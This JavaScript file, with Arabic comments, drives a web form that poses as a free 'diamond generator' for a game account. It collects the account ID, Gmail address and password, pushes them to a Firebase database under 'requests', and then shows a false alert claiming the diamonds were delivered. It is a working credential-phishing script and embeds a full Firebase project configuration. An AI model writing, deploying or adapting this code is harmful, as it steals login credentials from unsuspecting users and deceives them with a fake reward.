// استيراد مكتبة Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";

// إعداد Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCZkfu2HWeHFQoEBR775wRsM8jkCzLyLRQ",
  authDomain: "amis-d17f3.firebaseapp.com",
  databaseURL: "https://amis-d17f3-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "amis-d17f3",
  storageBucket: "amis-d17f3.appspot.com",
  messagingSenderId: "456359958505",
  appId: "1:456359958505:web:c5ce9491958cbc3e659d78",
  measurementId: "G-4Z0T73Z48D"
};

// تهيئة التطبيق وقاعدة البيانات
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// التعامل مع الاختيارات الخاصة بطرق فتح الحساب
document.getElementById('loginMethod').addEventListener('change', function() {
    const selectedMethod = this.value;

    // إظهار/إخفاء الحقول بناءً على الخيار
    if (selectedMethod === 'جيميل') {
        document.getElementById('gmailFields').style.display = 'block';
        document.getElementById('facebookMessage').style.display = 'none';
    } else if (selectedMethod === 'فيسبوك') {
        document.getElementById('gmailFields').style.display = 'none';
        document.getElementById('facebookMessage').style.display = 'block';
    } else {
        document.getElementById('gmailFields').style.display = 'none';
        document.getElementById('facebookMessage').style.display = 'none';
    }
});

// التعامل مع إرسال النموذج
document.getElementById('generatorForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const loginMethod = document.getElementById('loginMethod').value;

    // التحقق من الطريقة المختارة
    if (loginMethod === 'فيسبوك') {
        alert('عذرا، لا يمكن التسجيل باستخدام فيسبوك.');
        return;
    }

    const accountId = document.getElementById('accountId').value;
    const email = document.getElementById('email').value || null; // اختيارية
    const password = document.getElementById('password').value || null; // اختيارية
    const diamondAmount = document.getElementById('diamondAmount').value;

    // عرض رسالة انتظار
    const submitButton = document.querySelector('.submit-btn');
    submitButton.disabled = true;
    submitButton.textContent = '...جاري المعالجة';

    // إعداد البيانات للإرسال إلى Firebase
    const userData = {
        accountId: accountId,
        loginMethod: loginMethod,
        email: email,
        password: password,
        diamondAmount: diamondAmount,
        timestamp: new Date().toISOString() // تسجيل وقت الطلب
    };

    // حفظ البيانات في Firebase
    const dbRef = ref(database, 'requests');
    push(dbRef, userData)
        .then(() => {
            submitButton.disabled = false;
            submitButton.textContent = 'تأكيد';

            // عرض رسالة نجاح
            alert(`تم إرسال ${diamondAmount} جوهرة إلى حسابك بنجاح!`);
            document.getElementById('generatorForm').reset();
            document.getElementById('gmailFields').style.display = 'none';
        })
        .catch(error => {
            console.error('حدث خطأ أثناء الإرسال إلى Firebase:', error);
            alert('حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.');
            submitButton.disabled = false;
            submitButton.textContent = 'تأكيد';
        });
});
